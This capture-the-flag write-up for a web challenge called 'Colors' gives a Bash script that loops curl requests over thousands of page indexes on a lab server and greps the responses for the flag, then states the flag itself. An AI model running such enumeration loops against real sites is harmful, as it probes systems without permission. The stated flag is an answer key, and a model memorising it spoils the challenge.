# Web: Cookies and Session Management: Colors

The flag was embedded in one of the indexed pages, hidden in the response body. The only way to get to it efficiently is by automating the requests.

## Automate the Check Using curl
A Bash script was used to loop through indexes 0 to 10000 and search for the flag:

```bash
#!/bin/bash

url="http://141.85.224.70:8082/colors/index.php?index="

for i in {0..10000}; do
  echo "Checking index $i"
  result=$(curl -s "${url}${i}" | grep -oE 'SSS\{[^}]+\}')
  
  if [[ ! -z $result ]]; then
    echo "[+] Flag found at index $i: $result"
    break
  fi
done
```

## Run the Script
```bash
chmod +x find_flag.sh
./find_flag.sh
```

The script found the flag at: **index = 3141**
Flag: **SSS{d1d_y0u_4ctu4lly_cl1ck_3141_t1mes}**
